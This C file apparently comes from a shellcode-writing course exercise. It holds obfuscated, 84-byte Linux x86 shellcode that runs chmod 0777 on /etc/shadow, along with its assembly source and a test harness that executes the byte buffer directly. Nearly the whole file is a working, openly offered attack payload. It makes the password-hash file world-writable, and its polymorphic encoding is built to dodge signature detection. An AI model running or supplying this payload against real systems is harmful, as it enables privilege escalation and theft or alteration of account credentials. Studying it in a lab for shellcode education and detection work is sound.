/*
 *  Linux x86 - execve chmod 0777 /etc/shadow
 *  Obfuscated version - 84 bytes
 *  Original: http://shell-storm.org/shellcode/files/shellcode-828.php
 *  Author: xmgv
 *  Details: https://xmgv.wordpress.com/2015/03/13/slae-6-polymorphic-shellcode/
 */

/*
global _start

section .text

_start:
    sub edx, edx
    push edx
    mov eax, 0xb33fb33f
    sub eax, 0x3bd04ede
    push eax
    jmp short two

end:
    int 0x80

four:
    push edx
    push esi
    push ebp
    push ebx
    mov ecx, esp
    push byte 0xc
    pop eax
    dec eax
    jmp short end

three:
    push edx
    sub eax, 0x2c3d2dff
    push eax
    mov ebp, esp
    push edx
    add eax, 0x2d383638
    push eax
    sub eax, 0x013ffeff
    push eax
    sub eax, 0x3217d6d2
    add eax, 0x31179798
    push eax
    mov ebx, esp
    jmp short four

two:
    sub eax, 0x0efc3532
    push eax
    sub eax, 0x04feca01
    inc eax
    push eax
    mov esi, esp
    jmp short three
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] =
"\x29\xd2\x52\xb8\x3f\xb3\x3f\xb3\x2d\xde\x4e\xd0\x3b\x50\xeb\x33\xcd\x80"
"\x52\x56\x55\x53\x89\xe1\x6a\x0c\x58\x48\xeb\xf2\x52\x2d\xff\x2d\x3d\x2c"
"\x50\x89\xe5\x52\x05\x38\x36\x38\x2d\x50\x2d\xff\xfe\x3f\x01\x50\x2d\xd2"
"\xd6\x17\x32\x05\x98\x97\x17\x31\x50\x89\xe3\xeb\xcf\x2d\x32\x35\xfc\x0e"
"\x50\x2d\x01\xca\xfe\x04\x40\x50\x89\xe6\xeb\xca";


int main() {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}